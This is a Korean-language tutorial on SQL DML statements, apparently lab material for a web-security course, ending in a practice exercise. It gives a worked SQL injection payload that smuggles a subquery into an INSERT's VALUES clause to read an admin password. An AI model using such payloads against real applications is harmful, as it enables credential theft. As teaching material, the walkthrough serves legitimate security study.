SQL DML (Data manipulation language) :
    DML : 데이터베이스에서 데이터를 조회하거나, 추가/삭제/수정을 수행하는 구문입니다.

    즉, 일반적인 사용자가 입력하는 데이터는 대부분 DML을 통해 처리하게 됩니다.

    각 쿼리가 사용되어지는 목적과 형태를 이해하게 되면 SQL Injection 공격을 이해하는데 더 효과적입니다.
    또한 각 구문에서 사용자의 입력 데이터가 주로 사용되는 포인트와 구문마다 공격하는 방식에 대해 알아보도록 하겠습니다.

SELECT :
    데이터를 조회하는 구문입니다.

    ex)
        # mysql SELECT Statement https://dev.mysql.com/doc/refman/8.0/en/select.html
        SELECT
            select_expr [, select_expr] ...
        FROM table_references
        WHERE where_condition
        
        [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
        [ORDER BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]]
        [LIMIT {[offset,] row_count | row_count OFFSET offset}]

    위 SQL은 많이 사용되는 SELECT구문의 예시입니다.

        - SELECT문자열을 시작으로 조회의 결과로 사용될 표현식 또는 컬럼들에 대해 정의합니다.
        
        - FROM 절에서는 데이터를 조회하기 위한 테이블의 이름을 입력합니다.
        
        - WHERE 절에서는 해당 테이블내에 조회하는 데이터의 조건을 설정합니다.
        
        - ORDER BY 절은 쿼리의 결과 값들을 원하는 컬럼을 기준으로 정렬합니다.
        
        - LIMIT 절은 쿼리의 결과로 출력될 row의 개수를 또는 Offset을 지정합니다.

    SELECT 구문에서 사용자의 입력 데이터로 주로 사용되는 절은 데이터 조회를 위해 조건을 입력하는 WHERE 절과 쿼리 결과의 데이터들을 조절하기 위한 ORDER BY , LIMIT 절이 있습니다.

    ex) SELECT 예시

        SELECT
            uid, title, boardcontent
        FROM boards
        WHERE boardcontent like '%abc%'
        ORDER BY uid DESC
        LIMIT 5 

INSERT :
    데이터를 추가하기 위한 구문입니다.

    ex)
        # mysql INSERT Statement https://dev.mysql.com/doc/refman/8.0/en/insert.html
        INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
            [INTO] tbl_name
            [PARTITION (partition_name [, partition_name] ...)]
            [(col_name [, col_name] ...)]
            { {VALUES | VALUE} (value_list) [, (value_list)] ...
            |
            VALUES row_constructor_list
            }

        - INSERT 문자열을 시작으로 INSERT 구문이 시작하며, 데이터가 추가될 테이블을 정의합니다.
        
        - VALUE[S] 절에서는 추가될 데이터의 값을 입력합니다.
    
    INSERT 구문에서는 추가될 데이터의 값들이 입력되는 VALUE[S] 절에서 주로 SQL Injection이 발생하게 됩니다.

    ex) INSERT 예시
        INSERT 
            INTO boards (title, boardcontent)
            VALUES ('title 1', 'content 1'), ('title 2', 'content 2');

    ,를 통해 여러 데이터를 한번에 추가할 수도 있습니다.

    서브 쿼리를 통해 다른 테이블에 존재하는 데이터를 가진 row를 추가하여 데이터를 획득할 수도 있습니다.
    ex)
        INSERT 
            INTO boards (title, boardcontent)
            VALUES ('title 1', (select upw from users where uid='admin'));

UPDATE :
    데이터를 수정하는 구문입니다.
    ex)
        # mysql UPDATE https://dev.mysql.com/doc/refman/8.0/en/update.html
        UPDATE [LOW_PRIORITY] [IGNORE] table_references
            SET assignment_list
            [WHERE where_condition]

        - UPDATE문자열을 시작으로 수정을 요청할 테이블을 정의합니다.

        - SET절에서는 수정할 컬럼과 수정될 데이터를 정의합니다.

        - WHERE절을 통해 수정할 row를 지정합니다.

    UPDATE 구문에서 사용자의 입력 데이터로 주로 사용되는 절은 수정될 데이터가 입력되는 SET절과 수정 될 row를 지정하는 WHERE절이 있습니다.

    ex) UPDATE 예시
        UPDATE boards
            SET boardcontent = "update content 2"
            WHERE title = 'title 1';

DELETE :
    데이터를 삭제하는 구문입니다.
    ex)
        # mysql DELETE https://dev.mysql.com/doc/refman/8.0/en/delete.html
        DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name [[AS] tbl_alias]
            [PARTITION (partition_name [, partition_name] ...)]
            [WHERE where_condition]
            [ORDER BY ...]
            [LIMIT row_count]

        - DELETE FROM문자열을 시작으로 삭제할 데이터가 존재하는 테이블을 정의합니다.

        - WHERE 절을 통해 삭제할 데이터의 row를 지정합니다.

    DELETE 구문에서는 삭제될 row를 지정하는 WHERE절이 사용자의 데이터로 주로 사용됩니다.

    ex) DELETE 예시
        DELETE FROM boards
            WHERE title = 'title 1';

실습 :
    게시판 서비스 입니다.
    SQL Injection으로 admin 테이블에 있는 비밀번호를 찾으세요.

    Code :
        [setup.sql]
        CREATE TABLE admin (uid STRING, upw STRING);
        CREATE TABLE board (name STRING, text STRING);
        INSERT INTO admin (uid, upw) VALUES ('admin', [**FLAG**]);

    Input :
        Name:
        Text:

        Query 버튼

    Query:
        insert into board (name, text) values ("", "");

    Result :

    Board   리셋버튼

    답 :
        Name: ", (SELECT upw FROM admin)) --
        Text:

    Query:
        insert into board (name, text) values ("", (SELECT upw FROM admin)) --", "");
        Result : 1

    Board
        name: , text: Apple

    답) FLAG : Apple 

    Insert 쿼리의 VALUE 값에서 서브 쿼리를 사용할 수 있습니다.
    서브 쿼리를 통해 admin 테이블에 값을 가져올 수 있습니다.
    e.g.
    - id: ", (select upw from admin))--
    insert into board (uid, text) values ("", (select upw from admin))--", "");


